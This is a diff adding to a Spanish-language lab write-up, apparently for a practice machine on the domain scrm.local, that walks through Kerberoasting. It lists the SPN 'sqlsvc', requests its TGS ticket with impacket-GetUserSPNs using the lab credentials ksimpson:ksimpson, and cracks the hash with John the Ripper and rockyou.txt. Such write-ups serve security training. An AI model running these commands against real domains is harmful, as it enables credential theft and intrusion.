@@ -98,3 +98,16 @@ En caso de que nos este dando error al operar mediante `NTLM` por que puede ser 
 ```shell
 impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local
 ```
+
+Llegando a encontrar un `SPN` con el nombre `sqlsvc`
+A continuación probaremos a obtener el `TGS (Ticket Granting Service)` 
+
+Usaremos la misma herramienta que anteriormente
+```shell
+impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local -request
+```
+
+Obteniendo un hash *TGS* el cual vamos a intentar crackear con [[JOHN THE RIPPER]]
+```shell
+john -w /usr/share/wordlists/rockyou.txt hash
+```
